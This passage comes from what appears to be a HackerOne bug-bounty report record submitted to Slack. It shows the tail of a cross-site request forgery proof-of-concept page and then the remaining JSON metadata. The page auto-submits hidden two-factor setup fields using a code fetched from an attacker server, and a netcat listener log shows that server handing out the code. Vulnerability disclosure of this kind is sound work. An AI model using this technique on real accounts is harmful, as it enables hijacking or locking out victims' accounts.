type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"1\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"formatted&#95;phone&#95;number\" value=\"&#43;61&#32;421653999\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" id=\"scode\" name=\"confirmation&#95;code\" value=\"\" />\n    </form>\n<script>\n\tdocument.getElementById(\"scode\").value = scode;\n\tdocument.pocframe2.submit();\n</script>\n</body>\n</html>\n```\n\nAttacker web server:\n---------------------\n```\nroot@foxtrotter:/var/www/html# nc -nlvp 8080\nlistening on [any] 8080 ...\nconnect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194\nGET /a HTTP/1.1\nHost: 192.168.1.82:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.1.82/slackcsrf.html\nConnection: close\nCache-Control: max-age=0\n\nHTTP/1.1 200 OK\n\nscode=196206;\n```\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://slack.com", 
            "about": "All your team communication in one place, instantly searchable, and available wherever you go.", 
            "twitter_handle": "slackhq", 
            "name": "Slack"
        }, 
        "handle": "slack", 
        "url": "https://hackerone.com/slack", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/069/a44d7bfd843f514c723441a5a40daf5bac8e9e38_small.png?1449082084", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 69, 
        "default_currency": "usd"
    }, 
    "is_published": false
}